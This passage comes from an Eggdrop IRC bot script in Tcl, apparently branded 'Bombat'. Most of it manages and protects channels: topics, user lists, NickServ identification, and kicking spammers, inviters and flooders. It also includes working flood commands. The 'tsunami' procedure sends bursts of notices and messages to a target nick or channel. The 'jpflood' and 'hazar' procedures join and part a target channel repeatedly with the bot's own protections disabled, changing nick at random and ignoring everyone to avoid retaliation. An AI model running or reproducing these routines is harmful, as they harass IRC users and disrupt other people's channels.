    if {[userlist $rest]==""} {
      puthlp "NOTICE $nick :$fxlogo1 No users with flags \[$rest\]"
      return 0
    }
  }
}

proc val {string} {
  set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
  set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
  return $arg2
}

proc msg_topic {nick uhost hand rest} {
  global fxlogo1 botnick
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: topic <#> <topic>"
    return 0
  }
  set channel [lindex $rest 0]
  if {[string first # $rest] != 0} {
    set channel "#$channel"
  }
  if {![validchan $channel]} {
    puthlp "NOTICE $nick :$fxlogo1 NoT IN $channel"
    return 0
  }
  if {![isop $botnick $channel]} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP $channel"
    return 0
  }
  set rest [lrange $rest 1 end]
  putsrv "TOPIC $channel :$rest"
}

proc pub_topic {nick uhost hand channel rest} {
  global botnick fxlogo1 botnick
  if {![isop $botnick $channel]} { return 0 }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: topic <topic>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  putsrv "TOPIC $channel :$rest"
}

proc join_jf {nick uhost hand chan} {
  global botnick quick jpfchn jpfmsg jpfidx
  if {![info exists jpfmsg]} { return 0 }
  if {$nick != $botnick} { return 0 }
  if {$chan != $jpfchn} { return 0 }
  if {$quick == "1"} {
    putqck "PRIVMSG $chan :$jpfmsg,"
  } else {
    putsrv "PRIVMSG $chan :$jpfmsg,"
  }
  incr jpfidx
  if {$jpfidx >= 4} {
    catch { channel remove $jpfchn }
    catch { unset jpfchn }
    catch { unset jpfmsg }
    catch { unset jpfidx }
    puthlp "AWAY"
    return 0
  }
  if {$quick == "1"} {
    putqck "part $chan :$jpfmsg"
  } else {
    putsrv "part $chan :$jpfmsg"
  }
}

proc pub_jpflood {nick uhost hand channel rest} {
  global jpfchn jpfmsg jpfidx fxlogo1
  if {[string index $rest 0] != "#" || $rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: jpflood #channel message"
    return 0
  }
  if {[validchan [lindex $rest 0]]} {
    puthlp "NOTICE $nick :$fxlogo1 dOnt UsE ExIsT cHanneL..!"
    return 0
  }
  set jpfmsg " n0 ReAS0N "
  if {[lindex $rest 1] != ""} {
    set jpfmsg [lindex $rest 1]
  }
  set jpfchn [lindex $rest 0]
  set jpfidx 0
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  utimer 10 hazar
}

proc hazar {} {
  global jpfchn
  utimer 120 goback
  channel add $jpfchn
  catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}

proc pub_tsunami {nick uhost hand channel rest} {
  global cmd_chn cmd_by cmd_msg cmd_case botnick version fxlogo1 quick fz
  set person [lindex $rest 0]
  set rest [lrange $rest 1 end]
  if {$person == $botnick} { return 0 }
  if {[string index $person 0] == "#"} {
    if {[validchan $person]} {
      if {[isop $botnick $person] && ![matchattr $nick m]} {
        if {[isutimer "IN PROGRESS"]} { return 0 }
        utimer 20 [list putlog "&#171;Bombat&#187; IN PROGRESS"]
        putsrv "KICK $channel $nick :$fxlogo1 1Channel 4FLoOD1ing is a crimE!!"
        return 0
      }
    }
  }
  if {[matchattr $person n] && ![matchattr $nick Z]} {
    if {[isop $botnick $channel]} {
      putsrv "KICK $channel $nick :$fxlogo1 4FLOOD1 attempt..! i serve and protect my masters!"
    }
    if {[istimer "IN PROGRESS"]} { return 0 }
    timer 2 [list putlog "&#171;Bombat&#187; IN PROGRESS"]
    putsrv "NOTICE $nick :ADMIN FLOOD PROTECTION,"
    puthlp "NOTICE $nick :ADMIN fLood PRoTEcTIoN,"
    puthlp "NOTICE $nick :ADMIN FLOOD PROTECTION,"
    puthlp "NOTICE $nick :ADMIN fLood PRoTEcTIoN,"
    return 0
  }
  if {![matchattr $nick Z]} {
    return 0
  }
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: tsunami <nick/#> <msg>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[string tolower $person] == [string tolower $fz]} { return 0 }
  if {[string index $person 0] == "#"} {
    if {![validchan $person]} {
      pub_randnick $nick $uhost $hand $channel ""
      set cmd_chn $person
      set cmd_msg $rest
      set cmd_by $nick
      set cmd_case "1"
      channel add $person
      catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
      return 0
    }
  }
  catch { clearqueue all }
  pub_randnick $nick $uhost $hand $channel ""
  if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
  if {$quick == "1"} {
    putqck "PRIVMSG $person :$rest,"
    putqck "NOTICE $person :$rest,"
  }
  putsrv "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  puthlp "NOTICE $person :$rest,"
  utimer 10 {
    puthlp "AWAY"
  }
  utimer 120 goback
  return 0
}


proc auto_ident {min h d m y} {
  timer 5 ident_it
  auto_ping "0" "0" "0" "0" "0"
}

proc ident_it {} {
  global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
  global kickme deopme cmd_chn cmd_msg fz twice_msg keep-nick version fxlogo1 lastkey
  global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
  putlog "&#171;Bombat&#187; Auto reset & identify"
  catch { channel remove $jpfchn }
  catch { unset jpfchn }
  catch { unset jpfmsg }
  catch { unset jpfidx }
  catch {unset op_it}
  catch {unset is_m}
  catch {unset chk_reg}
  catch {unset flooddeop}
  catch {unset floodnick}
  catch {unset floodkick}
  catch {unset lastkey}
  catch {unset ex_flood}
  catch {unset invme}
  catch {unset pingchan}
  catch {unset twice_msg}
  catch {unset kickme}
  set deopme ""
  set cmd_chn ""
  set cmd_msg ""
  if {${server-online} == 0} { return 0 }
  if {![string match "FX??????????" $botnick] && ![string match "FX??????" $botnick]} {
    if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
  } else { goback }
  if {$botnick == $nick && $nickpass != ""} { putsrv "NickServ identify $nickpass" }
  if {$botnick != $nick && $nickpass != ""} { putsrv "NickServ identify $nick $nickpass" }
  if {$fz != $own} { set own $fz }
  if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}

proc auto_ping {min h d m y} {
  global botnick repeat_last repeat_person capsnick own fxlogo1 notc_chn bannick
  global unop server-online jpnick igflood is_ban iskick
  if {${server-online} == 0} {
    return 0
  }
  catch {unset iskick}
  catch {unset is_ban}
  catch {unset igflood}
  catch {unset jpnick}
  catch {unset unop}
  catch {unset bannick}
  catch {unset notc_chn}
  catch {unset capsnick}
  catch {unset repeat_person}
  catch {unset repeat_last}
}

proc remain {} {
  global botnick uptime timezone fxlogo1 fxlogo2 fxver longer awaym
  set totalyear [expr [unixtime] - $uptime]
  if {$totalyear >= 31536000} {
    set yearsfull [expr $totalyear/31536000]
    set years [expr int($yearsfull)]
    set yearssub [expr 31536000*$years]
    set totalday [expr $totalyear - $yearssub]
  }
  if {$totalyear < 31536000} {
    set totalday $totalyear
    set years 0
  }
  if {$totalday >= 86400} {
    set daysfull [expr $totalday/86400]
    set days [expr int($daysfull)]
    set dayssub [expr 86400*$days]
    set totalhour [expr $totalday - $dayssub]
  }
  if {$totalday < 86400} {
    set totalhour $totalday
    set days 0
  }
  if {$totalhour >= 3600} {
    set hoursfull [expr $totalhour/3600]
    set hours [expr int($hoursfull)]
    set hourssub [expr 3600*$hours]
    set totalmin [expr $totalhour - $hourssub]
  }
  if {$totalhour < 3600} {
    set totalmin $totalhour
    set hours 0
  }
  if {$totalmin >= 60} {
    set minsfull [expr $totalmin/60]
    set mins [expr int($minsfull)]
  }
  if {$totalmin < 60} {
    set mins 0
  }
  if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years Y, "} {set yearstext "$years Y, "}
  if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days D, "} {set daystext "$days D, "}
  if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours H, "} {set hourstext "$hours H, "}
  if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins M"} {set minstext "$mins M"}
  if {[string length $mins] == 1} {set mins "0${mins}"}
  if {[string length $hours] == 1} {set hours "0${hours}"}
  set output "${yearstext}${daystext}${hours}:${mins}"
  set output [string trimright $output ", "]
  if {[getuser "config" XTRA "AWAY"]!=""} {
    set longer "[getuser "config" XTRA "AWAY"] ([lgrnd])"
  } else {
    set awaymsg [lindex $awaym [rand [llength $awaym]]]
    set longer "$awaymsg ([lgrnd])"
  }
}

proc msg_userlist {nick hand uhost rest} {
  global fxlogo1
  pub_userlist $nick $uhost $hand "" $rest
}

proc pub_userlist {nick uhost hand chan rest} {
  global fz fxlogo1
  set akicklist " 4KIcKLIsT"
  foreach y [getuser "AKICK" HOSTS] {
    append akicklist " $y "
  }
  set users "UsERLIsT:"
  foreach x [userlist] {
    if {($x != "config") && ($x != "AKICK") && ($x != $fz) && ![matchattr $x A]} {
      if {[matchattr $x O]} {
        append users " 4$x "
      } else { append users " $x " }
      set flag [chattr $x]
      append users "($flag)"
    }
  }
  append users " \[$akicklist\]"
  if {[getuser "config" XTRA "IPG"] != ""} {
    append users " IpguaRd [getuser "config" XTRA "IPG"]"
  }
  if {[string length $users] > 300} {
    set half [expr [string length $users]/3]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$fxlogo1 $ntc"
    set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
    puthlp "NOTICE $nick :$fxlogo1 $ntc"
    set ntc "..[string range $users [expr $half + 1 + $half] end]"
    puthlp "NOTICE $nick :$fxlogo1 $ntc"
  } elseif {[string length $users] > 200} {
    set half [expr [string length $users]/2]
    set half [expr int($half)]
    set ntc "[string range $users 0 $half].."
    puthlp "NOTICE $nick :$fxlogo1 $ntc"
    set ntc "..[string range $users [expr $half + 1] end]"
    puthlp "NOTICE $nick :$fxlogo1 $ntc"
  } else {
    puthlp "NOTICE $nick :$fxlogo1 $users"
  }
  return 0
}

proc pub_ver {nick uhost hand chan rest} {
  global fxver
  puthlp "PRIVMSG $chan :$fxver"
  return 0
}

proc pub_nobot {nick uhost hand chan rest} {
  global botnick
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "pub_nobot"]} { return 0 }
  if {[rand 2] <= 1} {
    puthlp "PRIVMSG $chan :\001USERINFO\001"
  } else {
    puthlp "PRIVMSG $chan :\001CLIENTINFO\001"
  }
  return 0
}

proc ui_reply {nick uhost hand dest key arg} {
  global botnick bannick fxlogo1 ismaskhost
  if {![string match "*eggdrop*" $arg]} { return 0 }
  if {$nick == $botnick || [matchattr $nick f]} { return 0 }
  foreach x [channels] {
    if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
      if {[info exists ismaskhost]} {
        set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
      } else {
        set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
      }
      putsrv "KICK $x $nick :$fxlogo1 4[string toupper $x]1unknown 4EGGDROP1 ... identify your self!"
      return 0
    }
  }
}

proc pub_auth {nick uhost hand chan rest} {
  global botnick fxlogo1
  set cmd [string tolower [lindex $rest 0]]
  set ch [passwdok $nick ""]
  if {$ch == 1} {
    puthlp "NOTICE $nick :$fxlogo1 No password set. Usage: pass <password>"
    return 0
  }
  if {[matchattr $nick Q]} {
    puthlp "PRIVMSG $chan :${nick}, Yes"
  }
  if {![matchattr $nick Q]} {
    puthlp "PRIVMSG $chan :${nick}, No"
  }
}

proc notc_prot {nick uhost hand text {dest ""}} {
  global botnick notc_chn bannick quick ismaskhost is_m
  if {$dest != "" && $dest != $botnick} {
    if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
      foreach x [channels] {
        set x [string tolower $x]
        if {[string match "*$x*" [string tolower $dest]]} {
          set dest $x
          break
        }
      }
    }
    if {[isop $botnick $dest]} {
      if {[string match "*-greet*" [channel info $dest]]} { return 0 }
      if {$nick == "ChanServ"} { return 0 }
      if {$nick == $botnick} { return 0 }
      if {[matchattr $nick f]} { return 0 }
      if {[isop $nick $dest]} { return 0 }
      if {[isutimer "set_-m $dest"]} { return 0 }
      set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
      set bannick($nick) $banmask
      if {[info exists notc_chn($dest)]} {
        incr notc_chn($dest)
      } else {
        set notc_chn($dest) 1
      }
      if {$notc_chn($dest) == 1} {
        putsrv "KICK $dest $nick :[lgrnd] 1illegal 4NOTICE1 watch it...!"
      } elseif {$notc_chn($dest) == 2} {
        if {$quick == "1" && ![info exists is_m($dest)]} {
          putqck "KICK $dest $nick :[lgrnd] 1illegal 4NOTICE(s)1 it's strictly forbidden !"
        } else {
          putsrv "KICK $dest $nick :[lgrnd] 1illegal 4NOTICE1 here it comes...!"
        }
      } elseif {$notc_chn($dest) >= 3} {
        if {[info exists ismaskhost]} {
          set bannick($nick) [maskhost $banmask]
        }
        if {$quick == "1" && ![info exists is_m($dest)]} {
          putqck "KICK $dest $nick :[lgrnd] 1too many 4LAMER(s)1 from this host!"
        } else {
          putsrv "KICK $dest $nick :[lgrnd] 1too many 4LAMER(s)1 from this host!"
        }
      }
      return 0
    }
    repeat_pubm $nick $uhost $hand $dest $text
  } else {
    msg_prot $nick $uhost $hand $text
  }
}

proc setignore {mask reason time} {
  global quick
  foreach x [ignorelist] {
    if {[lindex $x 0] == $mask} { return 0 }
  }
  newignore $mask "IgN" $reason 15
  if {$quick == "1"} {
    putquick "silence +$mask"
  } else {
    putserv "silence +$mask"
  }
  utimer $time [list unsetignore $mask]
}

proc unsetignore {mask} {
  if {![isignore $mask]} { return 0 }
  putserv "silence -$mask"
  killignore $mask
}

set massmsg 0

proc msg_prot {unick uhost hand text} {
  global nick botnick invme own nickpass altpass fxlogo1 fxlogo2 virus_nick ex_flood fxver fz
  global altnick twice_msg version bannick massmsg keep-nick badwords quick is_m ismaskhost
  global querym
  set querymsg [lindex $querym [rand [llength $querym]]]
  regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
  msg_Z $unick $uhost $hand $text
  set real $text
  set text [uncolor $text]
  if {$unick == $botnick} { return 0 }
  if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
    set virus_nick $unick
    foreach x [channels] {
      if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
        if {[isop $botnick $x]} {
          set host [getchanhost $virus_nick $x]
          set host "*!*@[lindex [split $host @] 1]"
          set bannick($virus_nick) $host
          putsrv "KICK $x $virus_nick :$fxlogo1 1Mau ngirim virus ya 4S1pammer?!"
          set virus_nick ""
        } else {
          set members [chanlist $x f]
          foreach c $members {
            if {[isop $c $x]} {
              set sendspam "!kick [zip "$x $unick $fxlogo1 4SPAM1 detected from: 14@[lindex [split [getchanhost $virus_nick $x] @] 1]"]"
              putsrv "PRIVMSG $c :$sendspam"
              return 0
            }
          }
        }
      }
    }
    return 0
  }
  if {$unick == "ChanServ"} {
    if {[string match "*not authorized*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
      set partchn [lindex $text 9]
      set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
      if {[string match "*-secret*" [channel info $partchn]]} {
        putsrv "PART $partchn :Accessing..."
        channel remove $partchn
        savechan
      }
    }
    if {[string match "*is not on*" $text]} {
      set text [string tolower $text]
      foreach x [channels] {
        set x [string tolower $x]
        set cflag "c$x"
        set cflag [string range $cflag 0 8]
        if {[string match "*$x*" $text]} {
          if {![string match "*c*" [getchanmode $x]]} {
            putsrv "PART $x :1checking (4@1)ccess"
          } else {
            putsrv "PART $x :1checking (@)ccess"
          }
          if {[matchattr $cflag K]} {
            puthlp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]"
          } else {
            puthlp "JOIN $x"
          }
        }
      }
      return 0
    }
    if {[string match "*AOP:*SOP:*AKICK*" $text]} {
      foreach errchan [channels] {
        set cflag "c$errchan"
        set cflag [string range $cflag 0 8]
        if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
          if {![isop $botnick $errchan]} {
            timer 1 { putlog "&#171;Bombat&#187; resync" }
            if {![string match "*c*" [getchanmode $errchan]]} {
              putsrv "PART $errchan :1checking (4@1)ccess"
            } else {
              putsrv "PART $errchan :checking (@)ccess"
            }
            if {[matchattr $cflag K]} {
              puthlp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]"
            } else {
              puthlp "JOIN $errchan"
            }
          }
          return 0
        }
      }
    }
    return 0
  }
  if {$unick == "NickServ"} {
    if {[string match "*nick is owned*" [string tolower $text]]} {
      putlog "&#171;Bombat&#187; !Log! IDeNTIFY"
      catch { clearqueue all }
      if {$botnick == $nick && $nickpass != ""} {
        putsrv "NickServ identify $nickpass"
      }
      if {$botnick == $altnick && $altpass != ""} {
        putsrv "NickServ identify $altpass"
      }
    }
    if {[string match "*Password accepted*" $text]} { auto_reop }
    return 0
  }
  if {[string match "!kick*" [string tolower $text]]} {
    set salls [dezip [lrange $text 1 end]]
    set schan [lindex $salls 0]
    set snick [lindex $salls 1]
    set sreas [lrange $salls 2 end]
    if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
    set banhost [getchanhost $snick $schan]
    set banhost "*!*@[lindex [split $banhost @] 1]"
    set bannick($snick) $banhost
    regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas
    regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
    putsrv "KICK $schan $snick :$sreas"
    return 0
  }
  if {[string match "*auth*" $text] || [string match "*[string tolower $fz]*" [string tolower $text]]} { return 0 }
  if {[matchattr $hand f]} { return 0 }
  set mhost [string range $uhost [string first "@" $uhost] end]
  if {![isutimer "MSGCOUNTER"]} {
    utimer 20 { putlog "&#171;Bombat&#187; MSGCOUNTER" }
    set massmsg 1
  } else {
    set massmsg [incr massmsg]
    if {[string length $text] > 100} {
      set massmsg [incr massmsg]
    }
    if {$massmsg >= 5} {
      set massmsg 0
      set mhost [string range $uhost [string first "@" $uhost] end]
      setignore "*!*@*" "*" 120
      if {[info exists ismaskhost]} {
        setignore [maskhost "*!*$mhost"] "Mass Msg" 300
      } else {
        setignore "*!*$mhost" "Mass Msg" 300
      }
      foreach iamop [channels] {
        if {[isop $botnick $iamop]} {
          if {[string match "*c*" [getchanmode $iamop]]} {
            puthlp "PRIVMSG $iamop :\001ACTION Mass Msg..! from [unsix "$unick!$uhost"]\001"
          } else {
            puthlp "PRIVMSG $iamop :\001ACTION Mass Msg..! from 1[unsix "$unick!$uhost"]\001"
          }
          foreach c [chanlist $iamop] {
            set nickhost [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
            if {$nickhost == $mhost && ![matchattr $c f]} {
              if {$c == $botnick} { return 0 }
              set bannick($c) "*!*$mhost"
              putsrv "KICK $iamop $c :$fxlogo1 1msg 4FLOOD1 from: 4$mhost [banms]"
              break
            }
          }
        }
      }
      return 0
    }
  }
  if {[string match "*decode*" [string tolower $text]]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} {
          set bannick($unick) "*!*$mhost"
          putsrv "KICK $x $unick :$fxlogo1 1Anda terinfeksi 4S1pam 4V1irus!!"
          return 0
        } else {
          set members [chanlist $x f]
          foreach c $members {
            if {[isop $c $x]} {
              set sendspam "!kick [zip "$x $unick $fxlogo1 4DECODE1 report, attempted from: 14[string range $uhost [string first "@" $uhost] end] [banmsg]"]"
              putsrv "PRIVMSG $c :$sendspam"
              return 0
            }
          }
        }
      }
    }
    set invme($mhost) "dEcOdE"
  }
  if {[string match "*#*" $text]} {
    foreach x [channels] {
      set chksiton [string tolower $x]
      if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
    }
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} {
          set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
          set bannick($unick) $banmask
          putsrv "KICK $x $unick :$fxlogo1 1Jangan 4I1nvite gue!!"
          return 0
        } else {
          set members [chanlist $x f]
          foreach c $members {
            if {[isop $c $x]} {
              set sendspam "!kick [zip "$x $unick $fxlogo1 4INVITE1 report, attempted from: 14[string range $uhost [string first "@" $uhost] end] [banmsg]"]"
              putsrv "PRIVMSG $c :$sendspam"
              return 0
            }
          }
        }
      } else {
        set banmask "[string range $uhost [string first "@" $uhost] end]"
        if {$banmask != "*!*@*" && $banmask != "*"} {
          foreach c [chanlist $x] {
            set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
            if {$banmask == $nickhost} {
              if {[matchattr $c f]} {
                return 0
              }
              if {$c != $botnick} {
                if {[isop $botnick $x]} {
                  set bannick($c) $banmask
                  set mhost [string range $uhost [string first "@" $uhost] end]
                  putsrv "KICK $x $c :$fxlogo1 Dicurigai sbg 4INVITER1: 4$unick (1IP: 4$mhost"
                } else {
                  set members [chanlist $x f]
                  foreach s $members {
                    if {[isop $s $x]} {
                      set mhost [string range $uhost [string first "@" $uhost] end]
                      set sendspam "!kick [zip "$x $c $fxlogo1 4INVITE1 report, found at: 4$unick1 IP 4$mhost [banms]"]"
                      putsrv "PRIVMSG $s :$sendspam"
                      break
                    }
                  }
                }
                return 0
              }
            }
          }
        }
      }
    }
    set invme($mhost) "INVITE"
    return 0
  }
  if {[string match "*http://*" [string tolower $text]]} {
    foreach x [channels] {
      if {[onchan $unick $x]} {
        if {[isop $botnick $x]} {
          set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
          set bannick($unick) $banmask
          putsrv "KICK $x $unick :$fxlogo1 4ADVERTISEMENT1 is not allowed!"
          return 0
        } else {
          set members [chanlist $x f]
          foreach c $members {
            if {[isop $c $x]} {
              set sendspam "!kick [zip "$x $unick $fxlogo1 4ADVERTISER1 found on report: 14[string range $uhost [string first "@" $uhost] end] [banmsg]"]"
              putsrv "PRIVMSG $c :$sendspam"
              return 0
            }
          }
        }
      } else {
        set banmask "[string range $uhost [string first "@" $uhost] end]"
        if {$banmask != "*!*@*" && $banmask != "*"} {
          foreach c [chanlist $x] {
            set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
            if {$banmask == $nickhost} {
              if {[matchattr $c f]} {
                return 0
              }
              if {$c != $botnick} {
                if {[isop $botnick $x]} {
                  set bannick($c) $banmask
                  set mhost [string range $uhost [string first "@" $uhost] end]
                  putsrv "KICK $x $c :$fxlogo1 4ADVERTISER1: 4$unick 4IP: 4$mhost"
                } else {
                  set members [chanlist $x f]
                  foreach s $members {
                    if {[isop $s $x]} {
                      set mhost [string range $uhost [string first "@" $uhost] end]
                      set sendspam "!kick [zip "$x $c $fxlogo1 4ADVERTISER1 caught from: 4$unick1 IP 4$mhost [banms]"]"
                      putsrv "PRIVMSG $s :$sendspam"
                      return 0
                    }
                  }
                }
                return 0
              }
            }
          }
        }
      }
    }
    set invme($mhost) "AdvERTIsE"
    return 0
  }
  set mhost [string range $uhost [string first "@" $uhost] end]
  if {[string length $text] > 100} {
    set chr 0
    set cnt 0
    while {$cnt < [string length $real]} {
      if [isflood [string index $real $cnt]] {
        incr chr
      }
      incr cnt
    }
    if {$chr > 30} {
      setignore "*!*@*" "*" 120
      if {[info exists ismaskhost]} {
        setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
      } else {
        setignore "*!*$mhost" "TsunamI MSg" 300
      }
      foreach x [channels] {
        if {[isop $botnick $x]} {
          if {[string match "*c*" [getchanmode $x]]} {
            puthlp "PRIVMSG $x :\001ACTION TsunamI MSg..! dari [unsix "$unick!$uhost"]\001"
          } else {
            puthlp "PRIVMSG $x :\001ACTION TsunamI MSg..! dari 1[unsix "$unick!$uhost"]\001"
          }
          foreach c [chanlist $x] {
            set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
            if {$nickhost == $mhost} {
              if {[matchattr $c f] || $c == $botnick} {
                return 0
              }
              set bannick($c) "*!*$mhost"
              putsrv "KICK $x $c :$fxlogo1 4TSUNAMI1 terdeteksi dari: 4$mhost [banms]"
              break
            }
          }
        }
      }
      return 0
    }
  }
  foreach badword [string tolower $badwords] {
    if {[string match *$badword* [string tolower $text]]} {
      foreach x [channels] {
        if {[onchan $unick $x]} {
          if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
          if {[isop $botnick $x]} {
            set bannick($unick) "*!*$mhost"
            putsrv "KICK $x $unick :$fxlogo1 4BADWORD14 \[$mhost\]1 Kata: 4[string toupper $badword]"
            return 0
          } else {
            foreach s [chanlist $x f] {
              if {[isop $s $x]} {
                set sendspam "!kick [zip "$x $unick $fxlogo1 4BADWORD1 on msg, from: 4$mhost1 match on 4[string toupper $badword] [banms]"]"
                putsrv "PRIVMSG $s :$sendspam"
              }
            }
          }
        }
      }
    }
  }
  if {[string length $text] > 200} {
    if {![isutimer "LONGTEXT"]} {
      utimer 30 { putlog "&#171;Bombat&#187; LONGTEXT" }
      setignore "*!*@*" "*" 120
      if {[info exists ismaskhost]} {
        setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
      } else {
        setignore "*!*$mhost" "LoNg TexT MSg" 300
      }
    }
    foreach x [channels] {
      if {[isop $botnick $x]} {
        if {[string match "*c*" [getchanmode $x]]} {
          puthlp "PRIVMSG $x :\001ACTION Long Text Msg..! from [unsix "$unick!$uhost"]\001"
        } else {
          puthlp "PRIVMSG $x :\001ACTION Long Text Msg..! from 1[unsix "$unick!$uhost"]\001"
        }
        foreach c [chanlist $x] {
          set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
          if {$nickhost == $mhost} {
            if {[matchattr $c f] || $c == $botnick} { return 0 }
            set bannick($c) "*!*$mhost"
            putsrv "KICK $x $c :$fxlogo1 4LONG TEXT1 dari: 4$mhost [banms]"
            break
          }
        }
      } else {
        foreach c [chanlist $x] {
          set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
          if {$nickhost == $mhost} {
            if {[matchattr $c f] || $c == $botnick} {
              return 0
            }
            foreach s [chanlist $x f] {
              if {[isop $s $x]} {
                set sendspam "!kick [zip "$x $c $fxlogo1 1LONG TEXT MSG ... from 4$mhost [banms]"]"
                putsrv "PRIVMSG $s :$sendspam"
                break
              }
            }
          }
        }
      }
    }
    return 1
  }
  if {$unick != $own} {
    if {[info exists twice_msg($unick)]} {
      set hostmask "${unick}!*@*"
      puthlp "PRIVMSG $unick :$querymsg"
      putlog "&#171;Bombat&#187; !Log! IgNORE <$hostmask> PV-msg"
      unset twice_msg($unick)
      newignore $hostmask $unick "*" 2
    } else {
      if {[istimer "chkautomsg"]} {
        set invme($mhost) "AuToJoIN MSg"
        return 0
      }
      if {[isutimer "NO REPLY"]} {
        foreach x [utimers] {
          if {[string match "*NO REPLY*" $x]} {
            killutimer [lindex $x 2]
          }
        }
        utimer 10 { putlog "&#171;Bombat&#187; NO REPLY" }
        return 0
      }
      utimer 10 { putlog "&#171;Bombat&#187; NO REPLY" }
      if {[string match "*allnetwork.org" $uhost]} {
        puthlp "PRIVMSG $unick :$querymsg"
      } else {
        if {[getuser "config" XTRA "AWAY"]!=""} {
          puthlp "PRIVMSG $unick :$querymsg"
        } else {
          puthlp "PRIVMSG $unick :$querymsg"
        }
        set twice_msg($unick) 1
      }
    }
  }
}

proc auto_reop {} {
  global botnick fxc
  foreach x [channels] {
    if {[onchan $botnick $x]} {
      if {![isop $botnick $x] && [string tolower $x] != $fxc} {
        putsrv "CHANSERV OP $x $botnick"
      }
    }
  }
  return 0
}

proc msg_kick {nick uhost hand rest} {
  global fxlogo1 botnick own
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set reason [lrange $rest 2 end]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: kick <#chan> <Nick> <Reason>"
    return 0
  }
  if {[isop $botnick $chantarget]!=1} {
    puthlp "NOTICE $nick :$fxlogo1 Not op on $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
    return 0
  }
  if {$nicktarget == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 I cant self kick."
    return 0
  }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
    puthlp "NOTICE $nick :$fxlogo1 Cant kick my Admin."
    return 0
  }
  if {$reason == ""} {
    set reason "1ReQUEST..!"
    if {[matchattr $nick n]} {
      set reason "4KICK1 request4..!"
    }
    if {[matchattr $nick m] && ![matchattr $nick n]} {
      set reason "4KICK1 request4..!"
    }
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      putsrv "KICK $x $nicktarget :$fxlogo1 $reason"
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc msg_kickban {nick uhost hand rest} {
